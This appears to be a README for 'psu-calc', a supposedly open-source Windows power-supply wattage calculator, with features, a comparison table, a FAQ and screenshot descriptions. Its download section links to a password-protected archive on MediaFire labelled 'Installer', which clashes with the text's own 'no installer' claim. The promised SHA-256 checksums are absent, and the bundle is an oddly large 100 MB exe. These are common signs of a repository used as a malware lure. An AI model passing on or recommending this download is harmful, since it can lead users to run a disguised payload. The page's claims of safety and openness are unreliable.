# psu-calc

🔋 Free, open-source PSU wattage calculator for Windows — size a power supply from real component presets offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Component preset database** — CPUs and GPUs with stock and overclocked draw values, updated with new launches
- ✅ **Custom TDP entry** — add unlisted parts by wattage so exotic builds still get an answer
- ✅ **Transient headroom math** — models GPU power spikes, not just average TDP, and recommends a safe ceiling
- ✅ **Connector checklist** — counts required PCIe 8-pin and 12VHPWR plugs against typical PSU configs
- ✅ **Duty-cycle sweet spot** — shows the 40 to 60 percent load band where efficiency and fan noise peak
- ✅ **Build save and compare** — store several configurations and diff their estimated draw side by side
- ✅ **100 MB self-contained exe** — database bundled, portable, offline, MIT with SHA-256 releases

## Why psu-calc

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **psu-calc** | OuterVision | PCPartPicker | CM Calculator |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Freemium | Free web | Free web |
| Open source | **Yes** | No | No | No |
| Transient spike modeling | **Yes** | Paid tier | No | No |
| Offline, no account | **Yes** | No | No | No |
| Connector count checklist | **Yes** | No | Partial | No |
| Portable, no install | **Yes, 100 MB** | Web | Web | Web |

## FAQ

**how many watts do I need for my PC build?**

Average-TDP math undersizes modern GPUs because real boards spike far above their rating for microseconds, which is where instability stories start. psu-calc models those transients, adds the 40 to 60 percent efficiency band, and counts the PCIe connectors the wattage implies. It is a 100 MB portable exe, MIT, fully offline with a bundled preset database.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark builder (#121417, orange #FB923C): CPU and GPU pickers, RAM and drive steppers, live wattage gauge needle resting at 642 W.
2. Transient panel: spike graph peaking 1.8x TDP, recommended PSU range chip 750 to 850 W, efficiency band slider green.
3. Connector checklist: PCIe 8-pin count 3 of 4 satisfied, 12VHPWR row, saved builds list below with compare checkboxes.

## Download

| Source | Link |
|---|---|
| 💾 **Installer psu-calc** | [Installer psu-calc](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).